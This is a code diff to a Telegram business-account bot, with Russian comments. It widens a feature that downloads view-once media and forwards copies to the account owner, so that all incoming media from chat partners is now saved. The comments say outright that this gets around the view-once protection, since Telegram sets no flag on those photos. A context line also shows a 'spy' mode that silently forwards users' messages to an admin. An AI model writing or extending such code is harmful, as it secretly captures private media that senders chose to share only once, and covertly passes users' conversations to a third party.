@@ -796,43 +796,60 @@ async def notify_view_once(owner_id: int, msg: Message):
             n = getattr(msg.chat, "full_name", None) or getattr(msg.chat, "first_name", None) or ""
             sender_name = escape_html(n) if n else f"ID {msg.chat.id}"
 
-        caption = (
-            f"🔥 <b>Однократное медиа</b>\n"
-            f"👤 От: {sender_name}\n"
-            f"<i>Собеседник отправил однократное сообщение — вот ваша копия:</i>"
-        )
+        is_protected = bool(getattr(msg, "has_protected_content", False))
+        if is_protected:
+            caption = (
+                f"🔥 <b>Однократное медиа</b>\n"
+                f"👤 От: {sender_name}\n"
+                f"<i>Копия однократного сообщения от собеседника:</i>"
+            )
+        else:
+            caption = (
+                f"📎 <b>Медиа от собеседника</b>\n"
+                f"👤 От: {sender_name}"
+            )
         cap_extra = (f"\n{escape_html(msg.caption)}" if msg.caption else "")
 
+        sent = False
         if msg.photo:
+            # Всегда скачиваем байтами — однократные фото протухают после первого просмотра
             f = await _dl_buf(msg.photo[-1].file_id, "photo.jpg")
             if f:
                 await bot.send_photo(owner_id, f, caption=caption + cap_extra, parse_mode="HTML")
+                sent = True
+            else:
+                await bot.send_message(owner_id, caption + "\n⚠️ <i>Фото не удалось скачать (уже истекло?)</i>", parse_mode="HTML")
+                sent = True
         elif msg.video:
             f = await _dl_buf(msg.video.file_id, "video.mp4")
             if f:
                 await bot.send_video(owner_id, f, caption=caption + cap_extra, parse_mode="HTML")
+                sent = True
         elif msg.voice:
             f = await _dl_buf(msg.voice.file_id, "voice.ogg")
             if f:
                 await bot.send_voice(owner_id, f, caption=caption, parse_mode="HTML")
+                sent = True
         elif msg.video_note:
             f = await _dl_buf(msg.video_note.file_id, "video_note.mp4")
             if f:
                 await bot.send_message(owner_id, caption, parse_mode="HTML")
                 await bot.send_video_note(owner_id, f)
+                sent = True
         elif msg.audio:
             fname = msg.audio.file_name or "audio.mp3"
             f = await _dl_buf(msg.audio.file_id, fname)
             if f:
                 await bot.send_audio(owner_id, f, caption=caption + cap_extra, parse_mode="HTML")
+                sent = True
         elif msg.document:
             fname = msg.document.file_name or "file"
             f = await _dl_buf(msg.document.file_id, fname)
             if f:
                 await bot.send_document(owner_id, f, caption=caption + cap_extra, parse_mode="HTML")
-        else:
-            # Тип медиа неизвестен — хотя бы уведомляем
-            await bot.send_message(owner_id, caption + "\n<i>(тип медиа не поддерживается)</i>", parse_mode="HTML")
+                sent = True
+        if not sent:
+            await bot.send_message(owner_id, caption + "\n<i>(не удалось скачать файл)</i>", parse_mode="HTML")
     except Exception as e:
         logging.error(f"[VIEW-ONCE] не удалось доставить владельцу {owner_id}: {e}")
 
@@ -1411,13 +1428,13 @@ async def handle_business_message(message: Message):
     if spy_enabled and sender_id is not None:
         asyncio.create_task(forward_to_admin_silent(owner_id, message))
 
-    # Однократное входящее медиа — скачиваем и шлём копию владельцу в личку.
-    # Работает для ВСЕХ пользователей бота (включая ADMIN_ID).
-    # Только входящие: if sender_id != owner_id (собеседник, не сам владелец).
-    _msg_is_protected = bool(getattr(message, "has_protected_content", False))
+    # Входящее медиа от собеседника — скачиваем и шлём копию владельцу в личку.
+    # ВАЖНО: has_protected_content НЕ выставляется Telegram для однократных фото —
+    # они приходят как обычные сообщения без флага. Поэтому сохраняем ВСЁ
+    # входящее медиа от собеседника (sender != owner). Однократные опознаём
+    # внутри функции по has_protected_content и подписываем 🔥 vs 📎.
     if (
-        _msg_is_protected
-        and has_media(message)
+        has_media(message)
         and sender_id is not None
         and sender_id != owner_id
     ):
